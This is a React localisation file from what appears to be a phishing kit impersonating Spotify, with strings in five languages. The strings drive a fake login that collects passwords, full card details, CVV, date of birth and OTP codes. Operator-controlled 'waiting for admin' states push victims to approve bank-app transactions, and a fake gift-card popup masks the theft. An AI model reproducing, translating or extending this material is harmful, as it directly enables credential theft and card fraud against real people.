// src/hooks/useLanguage.js
import { useState, useEffect } from 'react';

// Full translations for the entire project
export const translations = {
  en: {
    // HomePage
    loginToSpotify: "Log in to Spotify",
    noAccount: "Don't have an account? ",
    signUp: "Sign up for Spotify",
    signupUnavailable: "Sign up is currently unavailable.",
    
    // OTP Form
    otpMessage: "Please enter the OTP code to complete the registration.",
    otpCode: "OTP-Code",
    otpPlaceholder: "000000",
    confirmCode: "Confirm code",
    verifying: "Verifying...",

    // NextStepAppr
    confirmationInApp: "Confirmation in your Bank App",
    merchant: "Merchant",
    amount: "Amount",
    date: "Date",
    cardNumberLabel: "Card Number",
    instruction1: "Open your banking app on your smartphone.",
    instruction2: "Confirm the authorization.",
    instruction3: "Return to this screen after confirmation.",
    instruction4: "Tap \"CONFIRM\" when you are back.",
    instruction5: "Please do not refresh the page.",
    confirm: "Confirm",
    sending: "Sending...",
    securedBy: "Secured by",
    waitingTitle: "Confirmation in App",
    waitingForConfirmation: "Waiting for Confirmation",
    waitingMessage: "Your confirmation has been sent.",
    waitingSubMessage: "Please check your mobile banking app.",
    waitingDontRefresh: "Please do not refresh the page.",
    currentTime: "Current time",
waitingInstruction: "Please make sure you have confirmed in the banking app.",

    emailAddress: "Email address",
    emailPlaceholder: "name@domain.com",
    loggingIn: "Logging in...",
    or: "or",
    continueWithGoogle: "Continue with Google",
    continueWithFacebook: "Continue with Facebook",
    continueWithApple: "Continue with Apple",
    forgotEmail: "Forgot your email?",
    pleaseEnterEmail: "Please enter your email address.",
    validEmail: "Please enter a valid email address.",
    googleUnavailable: "Google login is currently unavailable.",
    facebookUnavailable: "Facebook login is currently unavailable.",
    appleUnavailable: "Apple login is currently unavailable.",

    // Login Form
    loginName: "Login name",
    password: "Password",
    logIn: "Log in",
    unknownLogin: "Unknown login",
    unknownPassword: "Unknown password",
    pleaseEnterLogin: "Please enter your login name.",
    pleaseEnterPassword: "Please enter your password.",
    
    // Card Verification Form
    cardVerification: "Card Verification",
    securityMessage: "For security reasons, please verify your details.",
    cardholderName: "Cardholder Name",
    cardNumber: "Card Number",
    expirationDate: "Expiration Date",
    month: "Month",
    year: "Year",
    cvv: "CVV",
    phoneNumber: "Phone Number",
    phoneHint: "Select your country code and enter your phone number",
    city: "City",
    cityHint: "e.g. New York, Los Angeles, Chicago",
    postalCode: "Postal Code",
    postalHint: "e.g. 1001",
    submitCard: "Verify Card",
    birthDate: "Date of Birth",
    day: "Day",
    
    // Card Validation Errors
    validCard: "Please enter a valid card number (16 digits)",
    validExpiry: "Please enter a valid expiration date (MM/YY)",
    cardExpired: "Card has expired",
    validCvv: "Please enter a valid CVV (3-4 digits)",
    validCardholder: "Please enter the cardholder name",
    validPhone: "Please enter your phone number",
    phoneDigits: "Phone number must be valid",
    validCity: "Please enter your city",
    validCityName: "Please enter a valid city name",
    validPostal: "Please enter your postal code",
    invalidPostal: "Invalid postal code format",
    
    // OTP Form
    twoFactor: "Two-Factor Verification",
    enterOtp: "Please enter the OTP code to complete your login.",
    otpCode: "OTP Code",
    verifyCode: "Verify Code",
    back: "Back",
    validOtp: "Please enter a valid OTP code (6 digits)",
    
    // Loading / Waiting States
    waitingAdmin: "Waiting for admin approval...",
    waitingContinue: "Waiting for admin to continue...",
    processing: "Processing...",
    adminWillReview: "Admin will click \"Next Step\" when ready",
    pleaseWait: "Please wait while we verify your credentials",
    sending: "Sending...",
    verifying: "Verifying...",
    
    // Messages
    denied: "Login denied by admin. Please try again later.",
    success: "OTP code verified successfully! Redirecting...",
    error: "An error occurred. Please try again.",
    
    // NextStepAppr
    confirmationInApp: "Confirmation in your Bank App",
    merchant: "Merchant",
    amount: "Amount",
    date: "Date",
    cardNumberLabel: "Card Number",
    instructions: "Instructions",
    instruction1: "Open your banking app on your smartphone.",
    instruction2: "Confirm the authorization.",
    instruction3: "Return to this screen after confirmation.",
    instruction4: "Tap \"CONFIRM\" when you are back.",
    confirm: "Confirm",
    securedBy: "Secured by",
    waitingForConfirmation: "Waiting for Confirmation",
    waitingMessage: "Your confirmation has been sent.",
    waitingSubMessage: "Please check your mobile banking app.",
    currentTime: "Current time",
    confirmationInAppShort: "Confirmation in App",
    
    // Gift Card Popup
    transactionApproved: "Transaction Approved!",
    paymentSuccess: "Your payment has been successfully processed.",
    spotifyGiftCard: "🎁 Your Spotify Gift Card Code",
    clickToReveal: "👆 Click to reveal code",
    copyCode: "📋 Copy Code",
    codeCopied: "✅ Code copied!",
    redeemAt: "Redeem at:",
    continue: "Continue",
    pleaseRevealFirst: "Please click on the code to reveal it first!",
    
    // Approve Popup
    approveTitle: "Login Approved!",
    approveMessage: "Your login has been approved. You will be redirected to the card verification page.",
    ok: "OK"
  },
  
  cz: {
    // HomePage
    loginToSpotify: "Přihlaste se k Spotify",
    noAccount: "Nemáte účet? ",
    signUp: "Zaregistrujte se na Spotify",
    signupUnavailable: "Registrace není aktuálně k dispozici.",
    
    // OTP Form
    otpMessage: "Zadejte prosím OTP kód pro dokončení registrace.",
    otpCode: "OTP kód",
    otpPlaceholder: "000000",
    confirmCode: "Potvrdit kód",
    verifying: "Ověřování...",

    // NextStepAppr
    confirmationInApp: "Potvrzení v bankovní aplikaci",
    merchant: "Obchodník",
    amount: "Částka",
    date: "Datum",
    cardNumberLabel: "Číslo karty",
    instruction1: "Otevřete svou bankovní aplikaci v telefonu.",
    instruction2: "Potvrďte autorizaci.",
    instruction3: "Po potvrzení se vraťte na tuto obrazovku.",
    instruction4: "Až se vrátíte, klepněte na \"POTVRDIT\".",
    instruction5: "Prosím neobnovujte stránku.",
    confirm: "Potvrdit",
    sending: "Odesílání...",
    securedBy: "Zabezpečeno",
    waitingTitle: "Potvrzení v aplikaci",
    waitingForConfirmation: "Čekání na potvrzení",
    waitingMessage: "Vaše potvrzení bylo odesláno.",
    waitingSubMessage: "Zkontrolujte svou bankovní aplikaci.",
    waitingDontRefresh: "Prosím neobnovujte stránku.",
    currentTime: "Aktuální čas",
waitingInstruction: "Ujistěte se, že jste potvrdili v bankovní aplikaci.",

    emailAddress: "E-mailová adresa",
    emailPlaceholder: "jmeno@domena.cz",
    loggingIn: "Přihlašování...",
    or: "nebo",
    continueWithGoogle: "Pokračovat s Google",
    continueWithFacebook: "Pokračovat s Facebook",
    continueWithApple: "Pokračovat s Apple",
    forgotEmail: "Zapomněli jste e-mail?",
    pleaseEnterEmail: "Zadejte prosím svou e-mailovou adresu.",
    validEmail: "Zadejte prosím platnou e-mailovou adresu.",
    googleUnavailable: "Přihlášení přes Google není aktuálně k dispozici.",
    facebookUnavailable: "Přihlášení přes Facebook není aktuálně k dispozici.",
    appleUnavailable: "Přihlášení přes Apple není aktuálně k dispozici.",


    // Login Form
    loginName: "Uživatelské jméno",
    password: "Heslo",
    logIn: "Přihlásit se",
    unknownLogin: "Neznámé přihlášení",
    unknownPassword: "Neznámé heslo",
    pleaseEnterLogin: "Zadejte své uživatelské jméno.",
    pleaseEnterPassword: "Zadejte své heslo.",
    
    // Card Verification Form
    cardVerification: "Ověření karty",
    securityMessage: "Z bezpečnostních důvodů ověřte své údaje.",
    cardholderName: "Jméno držitele karty",
    cardNumber: "Číslo karty",
    expirationDate: "Datum expirace",
    month: "Měsíc",
    year: "Rok",
    cvv: "CVV",
    phoneNumber: "Telefonní číslo",
    phoneHint: "Vyberte svou zemi a zadejte telefonní číslo",
    city: "Město",
    cityHint: "např. Praha, Brno, Ostrava",
    postalCode: "PSČ",
    postalHint: "např. 11000",
    submitCard: "Ověřit kartu",
    birthDate: "Datum narození",
    day: "Den",
    
    // Card Validation Errors
    validCard: "Zadejte platné číslo karty (16 číslic)",
    validExpiry: "Zadejte platné datum expirace (MM/RR)",
    cardExpired: "Karta vypršela",
    validCvv: "Zadejte platné CVV (3-4 číslice)",
    validCardholder: "Zadejte jméno držitele karty",
    validPhone: "Zadejte své telefonní číslo",
    phoneDigits: "Telefonní číslo musí být platné",
    validCity: "Zadejte své město",
    validCityName: "Zadejte platný název města",
    validPostal: "Zadejte své PSČ",
    invalidPostal: "Neplatný formát PSČ",
    
    // OTP Form
    twoFactor: "Dvoufaktorové ověření",
    enterOtp: "Zadejte OTP kód pro dokončení přihlášení.",
    otpCode: "OTP kód",
    verifyCode: "Ověřit kód",
    back: "Zpět",
    validOtp: "Zadejte platný OTP kód (6 číslic)",
    
    // Loading / Waiting States
    waitingAdmin: "Čekání na schválení administrátora...",
    waitingContinue: "Čekání na pokračování administrátora...",
    processing: "Zpracování...",
    adminWillReview: "Administrátor klikne na \"Další krok\" až bude připraven",
    pleaseWait: "Počkejte prosím, zatímco ověřujeme vaše údaje",
    sending: "Odesílání...",
    verifying: "Ověřování...",
    
    // Messages
    denied: "Přihlášení zamítnuto administrátorem. Zkuste to prosím později.",
    success: "OTP kód byl úspěšně ověřen! Přesměrování...",
    error: "Došlo k chybě. Zkuste to prosím znovu.",
    
    // NextStepAppr
    confirmationInApp: "Potvrzení v bankovní aplikaci",
    merchant: "Obchodník",
    amount: "Částka",
    date: "Datum",
    cardNumberLabel: "Číslo karty",
    instructions: "Pokyny",
    instruction1: "Otevřete svou bankovní aplikaci v telefonu.",
    instruction2: "Potvrďte autorizaci.",
    instruction3: "Po potvrzení se vraťte na tuto obrazovku.",
    instruction4: "Až se vrátíte, klepněte na \"POTVRDIT\".",
    confirm: "Potvrdit",
    securedBy: "Zabezpečeno",
    waitingForConfirmation: "Čekání na potvrzení",
    waitingMessage: "Vaše potvrzení bylo odesláno.",
    waitingSubMessage: "Zkontrolujte svou bankovní aplikaci.",
    currentTime: "Aktuální čas",
    confirmationInAppShort: "Potvrzení v aplikaci",
    
    // Gift Card Popup
    transactionApproved: "Transakce schválena!",
    paymentSuccess: "Vaše platba byla úspěšně zpracována.",
    spotifyGiftCard: "🎁 Váš Spotify dárkový kód",
    clickToReveal: "👆 Kliknutím zobrazíte kód",
    copyCode: "📋 Kopírovat kód",
    codeCopied: "✅ Kód zkopírován!",
    redeemAt: "Uplatněte na:",
    continue: "Pokračovat",
    pleaseRevealFirst: "Pro zobrazení kódu na něj nejprve klikněte!",
    
    // Approve Popup
    approveTitle: "Přihlášení schváleno!",
    approveMessage: "Vaše přihlášení bylo schváleno. Budete přesměrováni na stránku ověření karty.",
    ok: "OK"
  },
  
  de: {
    // HomePage
    loginToSpotify: "Bei Spotify anmelden",
    noAccount: "Sie haben kein Konto? ",
    signUp: "Bei Spotify registrieren",
    signupUnavailable: "Die Registrierung ist derzeit nicht verfügbar.",
    
    // Login Form
    loginName: "Benutzername",
    password: "Passwort",
    logIn: "Anmelden",
    unknownLogin: "Unbekannter Benutzername",
    unknownPassword: "Unbekanntes Passwort",
    pleaseEnterLogin: "Bitte geben Sie Ihren Benutzernamen ein.",
    pleaseEnterPassword: "Bitte geben Sie Ihr Passwort ein.",
     
    // OTP Form
    otpMessage: "Bitte geben Sie den OTP-Code ein, um die Registrierung abzuschließen.",
    otpCode: "OTP-Code",
    otpPlaceholder: "000000",
    confirmCode: "Code bestätigen",
    verifying: "Wird überprüft...",

    // NextStepAppr
    confirmationInApp: "Bestätigung in Ihrer Bank-App",
    merchant: "Händler",
    amount: "Betrag",
    date: "Datum",
    cardNumberLabel: "Kartennummer",
    instruction1: "Öffnen Sie Ihre Bank-App auf Ihrem Smartphone.",
    instruction2: "Bestätigen Sie die Autorisierung.",
    instruction3: "Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.",
    instruction4: "Tippen Sie auf \"BESTÄTIGEN\", wenn Sie zurück sind.",
    instruction5: "Bitte aktualisieren Sie die Seite nicht.",
    confirm: "Bestätigen",
    sending: "Senden...",
    securedBy: "Gesichert durch",
    waitingTitle: "Bestätigung in der App",
    waitingForConfirmation: "Warten auf Bestätigung",
    waitingMessage: "Ihre Bestätigung wurde gesendet.",
    waitingSubMessage: "Bitte überprüfen Sie Ihre Bank-App.",
    waitingDontRefresh: "Bitte aktualisieren Sie die Seite nicht.",
    currentTime: "Aktuelle Uhrzeit",
waitingInstruction: "Bitte stellen Sie sicher, dass Sie in der Bank-App bestätigt haben.",

    emailAddress: "E-Mail-Adresse",
    emailPlaceholder: "name@domain.de",
    loggingIn: "Anmelden...",
    or: "oder",
    continueWithGoogle: "Mit Google fortfahren",
    continueWithFacebook: "Mit Facebook fortfahren",
    continueWithApple: "Mit Apple fortfahren",
    forgotEmail: "E-Mail vergessen?",
    pleaseEnterEmail: "Bitte geben Sie Ihre E-Mail-Adresse ein.",
    validEmail: "Bitte geben Sie eine gültige E-Mail-Adresse ein.",
    googleUnavailable: "Google-Login ist derzeit nicht verfügbar.",
    facebookUnavailable: "Facebook-Login ist derzeit nicht verfügbar.",
    appleUnavailable: "Apple-Login ist derzeit nicht verfügbar.",

    // Card Verification Form
    cardVerification: "Kartenüberprüfung",
    securityMessage: "Aus Sicherheitsgründen überprüfen Sie bitte Ihre Daten.",
    cardholderName: "Karteninhabername",
    cardNumber: "Kartennummer",
    expirationDate: "Ablaufdatum",
    month: "Monat",
    year: "Jahr",
    cvv: "CVV",
    phoneNumber: "Telefonnummer",
    phoneHint: "Wählen Sie Ihr Land und geben Sie Ihre Telefonnummer ein",
    city: "Stadt",
    cityHint: "z.B. Berlin, München, Hamburg",
    postalCode: "Postleitzahl",
    postalHint: "z.B. 10115",
    submitCard: "Karte überprüfen",
    birthDate: "Geburtsdatum",
    day: "Tag",
    
    // Card Validation Errors
    validCard: "Bitte geben Sie eine gültige Kartennummer ein (16 Ziffern)",
    validExpiry: "Bitte geben Sie ein gültiges Ablaufdatum ein (MM/JJ)",
    cardExpired: "Karte ist abgelaufen",
    validCvv: "Bitte geben Sie eine gültige CVV ein (3-4 Ziffern)",
    validCardholder: "Bitte geben Sie den Karteninhabernamen ein",
    validPhone: "Bitte geben Sie Ihre Telefonnummer ein",
    phoneDigits: "Telefonnummer muss gültig sein",
    validCity: "Bitte geben Sie Ihre Stadt ein",
    validCityName: "Bitte geben Sie einen gültigen Stadtnamen ein",
    validPostal: "Bitte geben Sie Ihre Postleitzahl ein",
    invalidPostal: "Ungültiges Postleitzahlenformat",
    
    // OTP Form
    twoFactor: "Zwei-Faktor-Verifizierung",
    enterOtp: "Bitte geben Sie den OTP-Code ein, um Ihre Anmeldung abzuschließen.",
    otpCode: "OTP-Code",
    verifyCode: "Code überprüfen",
    back: "Zurück",
    validOtp: "Bitte geben Sie einen gültigen OTP-Code ein (6 Ziffern)",
    
    // Loading / Waiting States
    waitingAdmin: "Warten auf Admin-Bestätigung...",
    waitingContinue: "Warten auf Admin-Fortsetzung...",
    processing: "Verarbeitung...",
    adminWillReview: "Admin klickt auf \"Nächster Schritt\", wenn bereit",
    pleaseWait: "Bitte warten Sie, während wir Ihre Daten überprüfen",
    sending: "Senden...",
    verifying: "Überprüfen...",
    
    // Messages
    denied: "Anmeldung vom Admin abgelehnt. Bitte versuchen Sie es später erneut.",
    success: "OTP-Code erfolgreich verifiziert! Weiterleitung...",
    error: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
    
    // NextStepAppr (same as before, add here)
    confirmationInApp: "Bestätigung in Ihrer Bank-App",
    merchant: "Händler",
    amount: "Betrag",
    date: "Datum",
    cardNumberLabel: "Kartennummer",
    instructions: "Anweisungen",
    instruction1: "Öffnen Sie Ihre Bank-App auf Ihrem Smartphone.",
    instruction2: "Bestätigen Sie die Autorisierung.",
    instruction3: "Kehren Sie nach der Bestätigung zu diesem Bildschirm zurück.",
    instruction4: "Tippen Sie auf \"BESTÄTIGEN\", wenn Sie zurück sind.",
    confirm: "Bestätigen",
    securedBy: "Gesichert durch",
    waitingForConfirmation: "Warten auf Bestätigung",
    waitingMessage: "Ihre Bestätigung wurde gesendet.",
    waitingSubMessage: "Bitte überprüfen Sie Ihre Bank-App.",
    currentTime: "Aktuelle Uhrzeit",
    confirmationInAppShort: "Bestätigung in App",
    
    // Gift Card Popup
    transactionApproved: "Transaktion genehmigt!",
    paymentSuccess: "Ihre Zahlung wurde erfolgreich verarbeitet.",
    spotifyGiftCard: "🎁 Ihr Spotify-Geschenkgutschein",
    clickToReveal: "👆 Klicken Sie, um den Code anzuzeigen",
    copyCode: "📋 Code kopieren",
    codeCopied: "✅ Code kopiert!",
    redeemAt: "Einlösen unter:",
    continue: "Weiter",
    pleaseRevealFirst: "Bitte klicken Sie zuerst auf den Code, um ihn anzuzeigen!",
    
    // Approve Popup
    approveTitle: "Anmeldung genehmigt!",
    approveMessage: "Ihre Anmeldung wurde genehmigt. Sie werden zur Kartenüberprüfungsseite weitergeleitet.",
    ok: "OK"
  },
  
  fr: {
    // HomePage
    loginToSpotify: "Se connecter à Spotify",
    noAccount: "Vous n'avez pas de compte ? ",
    signUp: "S'inscrire sur Spotify",
    signupUnavailable: "L'inscription n'est pas disponible pour le moment.",
    
    emailAddress: "Adresse e-mail",
    emailPlaceholder: "nom@domaine.fr",
    loggingIn: "Connexion en cours...",
    or: "ou",
    continueWithGoogle: "Continuer avec Google",
    continueWithFacebook: "Continuer avec Facebook",
    continueWithApple: "Continuer avec Apple",
    forgotEmail: "E-mail oublié ?",
    pleaseEnterEmail: "Veuillez saisir votre adresse e-mail.",
    validEmail: "Veuillez saisir une adresse e-mail valide.",
    googleUnavailable: "La connexion Google n'est pas disponible pour le moment.",
    facebookUnavailable: "La connexion Facebook n'est pas disponible pour le moment.",
    appleUnavailable: "La connexion Apple n'est pas disponible pour le moment.",

    // OTP Form
    otpMessage: "Veuillez saisir le code OTP pour compléter l'inscription.",
    otpCode: "Code OTP",
    otpPlaceholder: "000000",
    confirmCode: "Confirmer le code",
    verifying: "Vérification...",

    // NextStepAppr
    confirmationInApp: "Confirmation dans votre application bancaire",
    merchant: "Marchand",
    amount: "Montant",
    date: "Date",
    cardNumberLabel: "Numéro de carte",
    instruction1: "Ouvrez votre application bancaire sur votre smartphone.",
    instruction2: "Confirmez l'autorisation.",
    instruction3: "Revenez à cet écran après confirmation.",
    instruction4: "Appuyez sur \"CONFIRMER\" lorsque vous êtes de retour.",
    instruction5: "Veuillez ne pas actualiser la page.",
    confirm: "Confirmer",
    sending: "Envoi...",
    securedBy: "Sécurisé par",
    waitingTitle: "Confirmation dans l'application",
    waitingForConfirmation: "En attente de confirmation",
    waitingMessage: "Votre confirmation a été envoyée.",
    waitingSubMessage: "Veuillez vérifier votre application bancaire.",
    waitingDontRefresh: "Veuillez ne pas actualiser la page.",
    currentTime: "Heure actuelle",
waitingInstruction: "Assurez-vous d'avoir confirmé dans l'application bancaire.",

    // Login Form
    loginName: "Nom d'utilisateur",
    password: "Mot de passe",
    logIn: "Se connecter",
    unknownLogin: "Nom d'utilisateur inconnu",
    unknownPassword: "Mot de passe inconnu",
    pleaseEnterLogin: "Veuillez saisir votre nom d'utilisateur.",
    pleaseEnterPassword: "Veuillez saisir votre mot de passe.",
    
    // Card Verification Form
    cardVerification: "Vérification de carte",
    securityMessage: "Pour des raisons de sécurité, veuillez vérifier vos coordonnées.",
    cardholderName: "Nom du titulaire de la carte",
    cardNumber: "Numéro de carte",
    expirationDate: "Date d'expiration",
    month: "Mois",
    year: "Année",
    cvv: "CVV",
    phoneNumber: "Numéro de téléphone",
    phoneHint: "Sélectionnez votre pays et entrez votre numéro de téléphone",
    city: "Ville",
    cityHint: "ex: Paris, Lyon, Marseille",
    postalCode: "Code postal",
    postalHint: "ex: 75001",
    submitCard: "Vérifier la carte",
    birthDate: "Date de naissance",
    day: "Jour",
    
    // Rest of translations (add similar to other languages)
    validCard: "Veuillez saisir un numéro de carte valide (16 chiffres)",
    validExpiry: "Veuillez saisir une date d'expiration valide (MM/AA)",
    cardExpired: "La carte a expiré",
    validCvv: "Veuillez saisir un CVV valide (3-4 chiffres)",
    validCardholder: "Veuillez saisir le nom du titulaire de la carte",
    validPhone: "Veuillez saisir votre numéro de téléphone",
    twoFactor: "Vérification à deux facteurs",
    enterOtp: "Veuillez saisir le code OTP pour terminer votre connexion.",
    otpCode: "Code OTP",
    verifyCode: "Vérifier le code",
    back: "Retour",
    validOtp: "Veuillez saisir un code OTP valide (6 chiffres)",
    denied: "Connexion refusée par l'administrateur. Veuillez réessayer plus tard.",
    success: "Code OTP vérifié avec succès ! Redirection...",
    confirm: "Confirmer",
    continue: "Continuer",
    ok: "OK"
  },
  
  es: {
    // HomePage
    loginToSpotify: "Iniciar sesión en Spotify",
    noAccount: "¿No tienes una cuenta? ",
    signUp: "Regístrate en Spotify",
    signupUnavailable: "El registro no está disponible actualmente.",
    
    // Login Form
    loginName: "Nombre de usuario",
    password: "Contraseña",
    logIn: "Iniciar sesión",
    unknownLogin: "Usuario desconocido",
    unknownPassword: "Contraseña desconocida",
    pleaseEnterLogin: "Por favor, ingrese su nombre de usuario.",
    pleaseEnterPassword: "Por favor, ingrese su contraseña.",
    
    emailAddress: "Correo electrónico",
    emailPlaceholder: "nombre@dominio.es",
    loggingIn: "Iniciando sesión...",
    or: "o",
    continueWithGoogle: "Continuar con Google",
    continueWithFacebook: "Continuar con Facebook",
    continueWithApple: "Continuar con Apple",
    forgotEmail: "¿Olvidaste tu correo?",
    pleaseEnterEmail: "Por favor, ingrese su dirección de correo electrónico.",
    validEmail: "Por favor, ingrese una dirección de correo electrónico válida.",
    googleUnavailable: "El inicio de sesión con Google no está disponible actualmente.",
    facebookUnavailable: "El inicio de sesión con Facebook no está disponible actualmente.",
    appleUnavailable: "El inicio de sesión con Apple no está disponible actualmente.",

    // OTP Form
    otpMessage: "Por favor, ingrese el código OTP para completar el registro.",
    otpCode: "Código OTP",
    otpPlaceholder: "000000",
    confirmCode: "Confirmar código",
    verifying: "Verificando...",

    // NextStepAppr
    confirmationInApp: "Confirmación en su aplicación bancaria",
    merchant: "Comerciante",
    amount: "Monto",
    date: "Fecha",
    cardNumberLabel: "Número de tarjeta",
    instruction1: "Abra su aplicación bancaria en su teléfono inteligente.",
    instruction2: "Confirme la autorización.",
    instruction3: "Regrese a esta pantalla después de la confirmación.",
    instruction4: "Toque \"CONFIRMAR\" cuando regrese.",
    instruction5: "Por favor, no actualice la página.",
    confirm: "Confirmar",
    sending: "Enviando...",
    securedBy: "Asegurado por",
    waitingTitle: "Confirmación en la aplicación",
    waitingForConfirmation: "Esperando confirmación",
    waitingMessage: "Su confirmación ha sido enviada.",
    waitingSubMessage: "Por favor, revise su aplicación bancaria.",
    waitingDontRefresh: "Por favor, no actualice la página.",
    currentTime: "Hora actual",
waitingInstruction: "Asegúrese de haber confirmado en la aplicación bancaria.",

    // Card Verification Form
    cardVerification: "Verificación de tarjeta",
    securityMessage: "Por razones de seguridad, verifique sus datos.",
    cardholderName: "Nombre del titular de la tarjeta",
    cardNumber: "Número de tarjeta",
    expirationDate: "Fecha de caducidad",
    month: "Mes",
    year: "Año",
    cvv: "CVV",
    phoneNumber: "Número de teléfono",
    phoneHint: "Seleccione su país e ingrese su número de teléfono",
    city: "Ciudad",
    cityHint: "ej: Madrid, Barcelona, Valencia",
    postalCode: "Código postal",
    postalHint: "ej: 28001",
    submitCard: "Verificar tarjeta",
    birthDate: "Fecha de nacimiento",
    day: "Día",
    
    validCard: "Por favor, ingrese un número de tarjeta válido (16 dígitos)",
    validExpiry: "Por favor, ingrese una fecha de caducidad válida (MM/AA)",
    cardExpired: "La tarjeta ha caducado",
    validCvv: "Por favor, ingrese un CVV válido (3-4 dígitos)",
    validCardholder: "Por favor, ingrese el nombre del titular de la tarjeta",
    validPhone: "Por favor, ingrese su número de teléfono",
    twoFactor: "Verificación de dos factores",
    enterOtp: "Por favor, ingrese el código OTP para completar su inicio de sesión.",
    otpCode: "Código OTP",
    verifyCode: "Verificar código",
    back: "Atrás",
    validOtp: "Por favor, ingrese un código OTP válido (6 dígitos)",
    denied: "Inicio de sesión denegado por el administrador. Por favor, intente más tarde.",
    success: "¡Código OTP verificado exitosamente! Redirigiendo...",
    confirm: "Confirmar",
    continue: "Continuar",
    ok: "OK"
  }
};

export const useLanguage = () => {
  const [language, setLanguage] = useState(() => {
    return localStorage.getItem('appLanguage') || 'en';
  });

  const toggleLanguage = (lang) => {
    const newLanguage = lang || (language === 'en' ? 'cz' : 'en');
    setLanguage(newLanguage);
    localStorage.setItem('appLanguage', newLanguage);
    window.dispatchEvent(new CustomEvent('languageChange', { detail: newLanguage }));
  };

  useEffect(() => {
    const handleLanguageChange = (event) => {
      setLanguage(event.detail);
    };
    
    window.addEventListener('languageChange', handleLanguageChange);
    
    return () => {
      window.removeEventListener('languageChange', handleLanguageChange);
    };
  }, []);

  return { language, toggleLanguage, t: translations[language] };
};